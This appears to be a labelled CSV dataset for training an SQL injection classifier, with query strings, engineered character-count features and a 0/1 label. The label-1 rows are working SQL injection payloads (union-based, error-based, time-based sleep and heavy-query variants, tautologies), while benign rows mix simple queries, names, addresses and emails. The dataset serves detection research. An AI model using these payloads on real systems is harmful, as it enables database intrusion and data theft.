Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
SELECT TOP 3 * FROM ought WHERE attached = 'season',0,0,0,0,0,0,1,0,51,9,1,19,0,0,0,0,2,0,0
SELECT MIN ( height )  AS lost FROM fair,0,0,0,0,0,0,0,0,40,9,0,14,2,0,0,0,0,0,0
SELECT * FROM furniture ORDER BY improve DESC,0,0,0,0,0,0,0,0,45,7,0,16,0,0,0,0,0,0,0
"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,4,2,0,0,0,2,0,155,58,24,48,11,0,0,1,0,0,1
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0,0,0,0,0,0,2,0,63,12,0,25,0,0,0,0,4,0,0
adelina,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT youth ( s )  FROM tape UNION,0,0,0,0,0,0,0,0,35,8,0,10,2,0,0,0,0,0,0
"   SELECT COUNT ( donkey ) , before FROM parallel BY of",0,0,0,0,0,0,0,0,55,13,0,22,2,0,0,1,0,0,0
1'  )   where 5287  =  5287 and 7533  =  7533--,1,1,2,0,0,0,2,0,47,16,17,8,1,0,0,0,1,0,1
"1   )    )    as gobw where 3496  =  3496 union all select null,null,null,null,null,null,null,null,null--",1,0,2,0,1,0,1,0,105,22,9,61,2,9,0,8,0,0,1
rillo de gallo,0,0,0,0,0,0,0,0,14,2,0,12,0,0,0,0,0,0,0
"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow )  VALUES  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0,0,0,0,0,0,0,0,145,24,0,77,4,0,0,10,13,0,0
"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,2,0,0,0,2,0,165,59,47,38,11,0,3,6,0,0,1
1 where 7802  =  7802,0,0,0,0,0,0,1,0,21,6,9,5,0,0,0,0,0,0,1
"  SELECT * FROM hunt WHERE drew NOT IN  ( 'snake', 'hill', 'plural' )  ",0,0,0,0,0,0,0,0,71,17,0,23,2,0,0,2,6,0,0
SELECT * FROM passage  WHERE by NOT LIKE '[laid]%',0,0,0,0,0,1,0,0,50,9,0,13,2,0,0,0,2,0,0
SELECT COUNT ( angry ) FROM everywhere,0,0,0,0,0,0,0,0,38,6,0,15,2,0,0,0,0,0,0
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",0,0,1,0,1,0,1,0,83,14,40,19,1,0,0,6,0,0,1
SELECT AVG ( Price ) FROM thus,0,0,0,0,0,0,0,0,30,6,0,8,2,0,0,0,0,0,0
"entrada tamarit, 32,",0,0,0,0,0,0,0,0,20,2,2,14,0,0,0,2,0,0,0
3.79218E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM brown WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,53,10,4,9,0,0,0,0,0,0,0
"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",1,0,3,0,1,0,1,0,98,15,9,61,1,8,0,7,1,0,1
"calle dean miranda 106, 6-f",0,0,1,0,0,0,0,0,27,4,4,17,0,0,0,1,0,0,0
"1""  )   where 5870  =  5870 union all select null,null,null--",1,0,2,0,1,0,1,0,61,14,9,31,1,3,0,2,0,1,1
"-8477' union all select 2517,2517,2517--",1,0,3,0,1,0,0,0,40,4,16,14,0,0,0,2,1,0,1
stanczak-kasem@movil-google.tj,0,0,2,0,0,1,0,0,30,0,0,26,0,0,0,0,0,0,0
1  )   where 9708  =  9708,0,0,0,0,0,0,1,0,26,10,9,5,1,0,0,0,0,0,1
SELECT * FROM bell WHERE sheep = 'accurate'  AND  ( steel = 'drive' OR column = 'mouth' ) ,0,0,0,0,0,0,3,0,90,20,0,38,2,0,0,0,6,0,0
23 OR 1  =  1,0,0,0,0,0,0,1,0,13,6,4,0,0,0,0,0,0,0,1
1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,0,2,0,0,0,0,1,0,52,18,9,18,2,0,0,0,4,0,1
"-2197' union all select 8065,8065,8065,8065--",1,0,3,0,1,0,0,0,45,4,20,14,0,0,0,3,1,0,1
"c/ antonia lancha, 38, 1?h",0,0,0,0,0,1,0,0,26,4,3,15,0,0,0,2,0,0,0
58193627q,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',0,3,0,0,0,0,2,0,111,42,18,34,6,0,0,0,4,0,1
47209,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT * FROM large  WHERE see NOT LIKE '[mysterious]%',0,0,0,0,0,1,0,0,55,9,0,18,2,0,0,0,2,0,0
" select * from users where id  =  1 or "";.""  =  1 or 1  =  1 -- 1",1,2,2,0,0,0,3,1,65,24,5,26,0,0,0,0,0,2,1
"1"" union all select null,null,null,null,null,null#",0,0,0,0,1,0,0,0,50,4,1,38,0,6,0,5,0,1,1
65904927z,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
76971829y,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,0,2,0,0,0,2,2,0,189,83,39,37,16,0,3,6,0,4,1
SELECT * FROM apple WHERE test = 'eaten' LIMIT 3,0,0,0,0,0,0,1,0,48,9,1,14,0,0,0,0,2,0,0
"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",0,0,1,0,1,0,1,0,88,10,48,19,0,0,0,8,0,0,1
SELECT * FROM expect WHERE funny = 'wind' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,65,12,1,15,0,0,0,0,2,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",0,1,0,0,0,0,1,0,116,27,3,73,3,0,0,2,0,3,1
SELECT COUNT ( engineer ) FROM tie,0,0,0,0,0,0,0,0,34,6,0,11,2,0,0,0,0,0,0
"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,4,2,0,0,0,2,0,161,64,24,47,12,0,0,1,0,0,1
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,4,2,0,0,0,2,0,155,58,24,47,11,0,0,1,1,0,1
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,0,2,0,0,0,2,2,0,195,87,32,46,16,0,3,4,0,4,1
6.58835E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,45,8,1,7,0,0,0,0,0,0,0
SELECT COUNT ( against ) FROM hang,0,0,0,0,0,0,0,0,34,6,0,11,2,0,0,0,0,0,0
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,2,2,0,0,0,2,0,58,19,5,26,0,0,0,0,0,0,1
SELECT * FROM adult WHERE major = 'pure',0,0,0,0,0,0,1,0,40,7,0,14,0,0,0,0,2,0,0
SELECT AVG ( Price ) FROM wing,0,0,0,0,0,0,0,0,30,6,0,8,2,0,0,0,0,0,0
25938703q,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1,0,0,0,0,2,0,72,30,18,15,4,0,0,1,0,1,1
"1%""   )    )     )   union all select null#",0,0,0,0,1,1,0,0,43,18,1,18,3,1,0,0,0,1,1
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",0,0,1,0,1,0,0,0,64,4,36,14,0,0,0,7,1,0,1
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1,2,0,1,2,2,0,81,22,4,35,0,0,0,1,3,0,1
"1,  (  select   (  case when   (  8674  =  7896  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",0,0,0,0,0,0,1,0,140,59,12,56,10,0,0,1,0,0,1
SELECT * FROM anywhere WHERE am = 'everything'  OR bigger = 'dropped',0,0,0,0,0,0,2,0,69,12,0,33,0,0,0,0,4,0,0
-2717'   )    )     )   or 8571  =  8571--,1,1,3,0,0,0,1,0,42,20,12,2,3,0,0,0,1,0,1
5.68541E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
falisco,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"  SELECT library,making,fed FROM spoken LEFT JOIN Orders ON slope.begunID =  lesson.transportation ORDER BY split.row",0,0,0,0,0,0,1,0,117,16,0,65,0,0,0,2,0,0,0
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,0,3,0,1,2,1,0,74,18,3,33,0,0,0,1,3,0,1
SELECT becoming ( s )  FROM something LEFT JOIN,0,0,0,0,0,0,0,0,47,9,0,18,2,0,0,0,0,0,0
SELECT * FROM  ( SELECT place FROM likely ) ,0,0,0,0,0,0,0,0,44,10,0,11,2,0,0,0,0,0,0
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0,0,0,0,0,0,2,0,59,12,0,23,0,0,0,0,4,0,0
bertilia,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
SELECT * FROM function  WHERE object = end,0,0,0,0,0,0,1,0,42,8,0,17,0,0,0,0,0,0,0
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,0,1,0,0,0,1,1,0,52,22,3,15,3,0,0,0,2,3,1
ballista@kpincentives.sa,0,0,0,0,0,1,0,0,24,0,0,22,0,0,0,0,0,0,0
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,0,2,1,0,0,0,2,0,68,32,12,13,4,0,0,0,4,0,1
28221877a,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
%2A%28%7C%28objectclass%3D%2A%29%29,0,0,0,0,0,8,0,0,35,0,12,11,0,0,0,0,0,0,1
manzano babot,0,0,0,0,0,0,0,0,13,1,0,12,0,0,0,0,0,0,0
biota,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
SELECT cannot FROM half UNION SELECT curve FROM very ORDER BY machinery,0,0,0,0,0,0,0,0,71,11,0,28,0,0,0,0,0,0,0
SELECT * FROM although 3,0,0,0,0,0,0,0,0,24,4,1,8,0,0,0,0,0,0,0
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned',0,0,0,0,0,0,2,0,68,12,0,32,0,0,0,0,4,0,0
mosegui bofill,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
SELECT * FROM hay WHERE gold = 'writing',0,0,0,0,0,0,1,0,40,7,0,14,0,0,0,0,2,0,0
SELECT * FROM  ( SELECT wrapped FROM green ) ,0,0,0,0,0,0,0,0,45,10,0,12,2,0,0,0,0,0,0
"  SELECT DAYOFMONTH ( ""2017-06-15"" ) ;",0,0,2,0,0,0,0,1,38,7,8,0,2,0,0,0,0,2,0
"-5190%"" or 8298  =  9306 and ""%""  =  """,0,2,1,0,0,2,2,0,38,12,12,5,0,0,0,0,0,4,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7515 )  ORDER BY meta_id ASC",0,0,0,0,0,0,0,0,102,17,4,44,2,0,0,2,0,0,0
DELETE FROM eager,0,0,0,0,0,0,0,0,17,2,0,5,0,0,0,0,0,0,0
SELECT AVG ( third ) FROM tool SELECT SUM ( not ) ,0,1,0,0,0,0,0,0,50,12,0,12,4,0,0,0,0,0,0
SELECT * FROM drew WHERE NOT fuel = 'soldier'  AND NOT scene = 'chicken',0,0,0,0,0,0,2,0,72,14,0,27,0,0,0,0,4,0,0
florestano,0,0,0,0,0,0,0,0,10,0,0,10,0,0,0,0,0,0,0
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'zspf'  =  'zspf",0,2,0,0,0,0,2,0,134,56,15,43,10,0,0,1,6,0,1
SELECT TOP 50 PERCENT * FROM cross,0,0,0,0,0,0,0,0,34,6,2,5,0,0,0,0,0,0,0
SELECT * FROM verb WHERE attention = 'train',0,0,0,0,0,0,1,0,44,7,0,18,0,0,0,0,2,0,0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,2,0,1,0,2,0,100,24,5,62,0,0,0,1,0,0,1
"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",0,12,1,0,0,0,2,0,377,166,52,95,34,0,0,1,4,0,1
"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,2,0,0,0,2,0,159,48,18,73,6,0,0,4,0,0,1
plmaces de jadraque,0,0,0,0,0,0,0,0,19,2,0,17,0,0,0,0,0,0,0
"  SELECT rateID AS ID, avoid AS recall FROM rice",0,0,0,0,0,0,0,0,48,10,0,19,0,0,0,1,0,0,0
SELECT border,0,0,0,0,0,0,0,0,13,1,0,6,0,0,0,0,0,0,0
"   SELECT COUNT ( positive ) , sentence FROM ahead BY sometime",0,0,0,0,0,0,0,0,62,13,0,29,2,0,0,1,0,0,0
herminia,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr",0,2,0,0,0,0,1,0,147,67,13,47,12,0,0,1,0,4,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,0,2,0,0,0,0,0,99,17,3,69,2,0,0,2,0,0,1
condensativo,0,0,0,0,0,0,0,0,12,0,0,12,0,0,0,0,0,0,0
sookdeo,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT * FROM had  WHERE shelter = nearer,0,0,0,0,0,0,1,0,41,8,0,16,0,0,0,0,0,0,0
SELECT AVG ( driven ) FROM length,0,0,0,0,0,0,0,0,33,6,0,12,2,0,0,0,0,0,0
admin'  )   or '1'  =  '1'/*,0,1,0,0,0,0,1,0,28,10,2,7,1,0,0,0,5,0,1
"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake )  VALUES  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )  ",0,0,0,0,0,0,0,0,143,24,0,75,4,0,0,10,13,0,0
SELECT * FROM porch WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,53,10,4,9,0,0,0,0,0,0,0
1 and 9412  =  6877#,0,1,0,0,0,0,1,0,20,6,9,3,0,0,0,0,0,0,1
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,14,3,0,0,0,3,0,421,183,62,105,38,0,0,0,0,1,1
SELECT COUNT ( officer ) FROM suddenly,0,0,0,0,0,0,0,0,38,6,0,15,2,0,0,0,0,0,0
SELECT * FROM brother 3,0,0,0,0,0,0,0,0,23,4,1,7,0,0,0,0,0,0,0
select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,1,1,2,0,0,1,2,0,63,26,4,24,2,0,0,0,0,0,1
SELECT * FROM yet,0,0,0,0,0,0,0,0,17,3,0,3,0,0,0,0,0,0,0
 UPDATE slipped SET field = 'pleasant'WHERE ocean = 'hungry',0,0,0,0,0,0,2,0,60,9,0,31,0,0,0,0,4,0,0
"   SELECT even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there AS oil  FROM flight",0,0,6,0,0,0,0,0,82,22,0,33,0,0,0,3,6,0,0
SELECT origin FROM method UNION ALL SELECT principle FROM battle ORDER BY one,0,0,0,0,0,0,0,0,77,12,0,30,0,0,0,0,0,0,0
4.97885E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"1""  )   where 6065  =  6065 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,2,0,0,0,2,0,200,49,20,114,5,0,0,6,0,1,1
"1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,2,0,0,0,2,0,162,45,17,83,5,0,0,3,0,0,1
"-9535"" order by 1--",1,0,3,0,0,0,0,0,19,3,5,7,0,0,0,0,0,1,1
"  UPDATE feature SET white =  'or', City =  'cry' WHERE stay =  dream",0,0,0,0,0,0,3,0,69,17,0,29,0,0,0,1,4,0,0
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1,0,2,1,0,0,1,0,63,18,12,28,2,0,0,0,0,0,1
SELECT RADIANS ( 180 ) ;,0,0,0,0,0,0,0,1,24,5,3,0,2,0,0,0,0,0,0
SELECT * FROM slightly FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,46,8,1,8,0,0,0,0,0,0,0
SELECT TOP 50 PERCENT * FROM chemical,0,0,0,0,0,0,0,0,37,6,2,8,0,0,0,0,0,0,0
SELECT * FROM rain WHERE movement = 'garden' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,68,12,1,18,0,0,0,0,2,0,0
pool echenique,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
vlor,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
l+echosa,0,0,1,0,0,0,0,0,8,0,0,7,0,0,0,0,0,0,0
"SELECT * FROM himself WHERE worker BETWEEN ""powder"" AND    ""move""",0,0,0,0,0,0,0,0,65,12,0,23,0,0,0,0,0,4,0
"   SELECT are, zulu+ ', ' + practical+ ' ' + hour+ ', ' + beside AS correctly  FROM go",0,0,6,0,0,0,0,0,86,22,0,37,0,0,0,3,6,0,0
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,1,3,0,1,2,1,0,73,17,3,35,0,0,0,1,0,0,1
SELECT Count ( * )  AS season,0,0,0,0,0,0,0,0,29,7,0,10,2,0,0,0,0,0,0
or 0  =  0 --,1,0,2,0,0,0,1,0,13,6,2,2,0,0,0,0,0,0,1
alises,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,12,0,0,0,2,0,351,164,55,83,34,0,0,0,1,0,1
16118,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT AVG ( wear ) FROM unless SELECT SUM ( carry ) ,0,0,0,0,0,0,0,0,53,12,0,15,4,0,0,0,0,0,0
1%' and 7533  =  7533 and '%'  =  ',0,2,0,0,0,2,2,0,35,12,9,6,0,0,0,0,4,0,1
"  SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )  ",0,0,0,0,0,0,0,0,86,16,0,42,2,0,0,2,6,0,0
SELECT * FROM gun WHERE thy = 'surface'  OR compass = 'total',0,0,0,0,0,0,2,0,61,12,0,25,0,0,0,0,4,0,0
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nhmz' like 'nhmz",0,2,0,0,0,0,1,0,161,53,39,48,10,0,3,6,4,0,1
SELECT COUNT ( question ) FROM produce,0,0,0,0,0,0,0,0,38,6,0,15,2,0,0,0,0,0,0
1 where 7464  =  7464 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,0,2,0,0,0,2,0,113,46,21,36,6,0,1,0,0,0,1
1   )    )    as zoso where 3633  =  3633,0,0,0,0,0,0,1,0,41,18,9,11,2,0,0,0,0,0,1
SELECT hot ( s )  FROM distant SELECT rose FROM area,0,0,0,0,0,0,0,0,52,11,0,19,2,0,0,0,0,0,0
5.65818E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",0,2,0,0,0,0,2,0,294,117,43,100,22,0,2,5,0,0,1
SELECT Count ( * )  AS shelf,0,0,0,0,0,0,0,0,28,7,0,9,2,0,0,0,0,0,0
33371147x,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",0,2,0,0,0,0,1,0,161,55,8,79,8,0,0,2,4,0,1
SELECT * FROM case FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM number,0,0,0,0,0,0,0,0,77,14,3,10,0,0,0,0,0,0,0
SELECT * FROM buy WHERE vapor  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,48,10,4,8,0,0,0,0,0,0,0
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,11,1,0,0,0,2,0,331,142,52,80,30,0,0,1,0,1,1
valladolid,0,0,0,0,0,0,0,0,10,0,0,10,0,0,0,0,0,0,0
SELECT spring ( s )  FROM salmon LEFT JOIN,0,0,0,0,0,0,0,0,42,9,0,13,2,0,0,0,0,0,0
glvez matons,0,0,0,0,0,0,0,0,12,1,0,11,0,0,0,0,0,0,0
"SELECT LOG ( 2, 4 ) ;",0,0,0,0,0,0,0,1,21,6,2,0,2,0,0,1,0,0,0
SELECT * FROM statement WHERE bell  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,53,10,4,13,0,0,0,0,0,0,0
"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1,1,3,0,1,0,1,0,120,17,48,37,1,0,0,8,3,0,1
hi' or 'x'  =  'x';,0,1,0,0,0,0,1,1,19,6,0,6,0,0,0,0,5,0,1
SELECT AVG ( feel ) FROM its SELECT SUM ( city ) ,0,0,0,0,0,0,0,0,49,12,0,11,4,0,0,0,0,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'pshn' like 'pshn",0,1,0,0,0,0,0,0,141,37,4,84,5,0,0,3,3,0,1
"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,2,0,0,0,2,0,111,41,21,36,6,0,0,1,0,0,1
SELECT AVG ( prize )  FROM bad  SELECT SUM ( quarter ) ,0,0,0,0,0,0,0,0,55,14,0,15,4,0,0,0,0,0,0
"1'   )    )     )   and elt  (  2506  =  2383,2383  )   and    (    (     (  'bjrj'  =  'bjrj",0,2,0,0,0,0,2,0,93,48,13,17,8,0,0,1,4,0,1
-5852  )   as anca where 3574  =  3574 or 3958  =  5536#,0,1,1,0,0,0,2,0,56,18,20,13,1,0,0,0,0,0,1
"c/ pozo seco 37, 6-d",0,0,1,0,0,0,0,0,20,4,3,10,0,0,0,1,0,0,0
SELECT * FROM  ( SELECT blew FROM method ) ,0,0,0,0,0,0,0,0,43,10,0,10,2,0,0,0,0,0,0
"calle puebla de los infantes, 145",0,0,0,0,0,0,0,0,33,5,3,24,0,0,0,1,0,0,0
SELECT glass ( s )  FROM keep UNION,0,0,0,0,0,0,0,0,35,8,0,10,2,0,0,0,0,0,0
-7710' where 5658  =  5658 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,11,3,0,0,0,3,0,358,162,56,79,32,0,0,0,1,0,1
SELECT DEGREES ( PI (  ) *2 ) ;,0,0,0,0,0,0,0,1,31,9,1,0,4,0,0,0,0,0,0
"INSERT INTO solar ( army, rise, youth, course, select, electricity )  VALUES  ( 'exist', 'anywhere'. product', 'near', 'market', 'section', 'however' )  ",0,0,0,0,0,0,0,0,153,24,0,85,4,0,0,10,13,0,0
SELECT * FROM after FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,43,8,1,5,0,0,0,0,0,0,0
4.27735E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"  UPDATE shade SET scene =  'failed', City =  'herself' WHERE fastened =  fear",0,0,0,0,0,0,3,0,78,17,0,38,0,0,0,1,4,0,0
"  SELECT Orders.strugglerID, Employees.truck, Employees.therefore FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.freedomID ORDER BY Orders.dearID",0,0,0,0,0,0,1,0,165,18,0,93,0,0,0,2,0,0,0
-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,0,11,1,0,0,0,2,0,328,136,48,88,29,0,0,0,0,0,1
stanger-kitabayashi7@gestionsoftware.th,0,0,1,0,0,1,0,0,39,0,1,35,0,0,0,0,0,0,0
